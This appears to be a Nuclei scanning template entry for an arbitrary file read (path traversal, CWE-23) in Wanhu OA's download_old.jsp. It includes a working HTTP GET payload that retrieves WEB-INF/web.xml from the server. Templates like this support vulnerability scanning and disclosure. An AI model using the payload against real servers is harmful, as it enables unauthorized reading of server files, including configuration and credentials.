# Nuclei Template: Wanhu OA download_old.jsp - Arbitrary File Read
**Template ID:** wanhu-download-old-file-read
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`wanhu-download-old-file-read.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary file download vulnerability in the Wanhu OA download_old.jsp file. An attacker can download any file on the server through the vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml
```

## References
- http://wiki.peiqi.tech/wiki/oa/万户OA/万户OA%20download_old.jsp%20任意文件下载漏洞.html
- https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/wanhu-oa-download-old-file-read.yaml
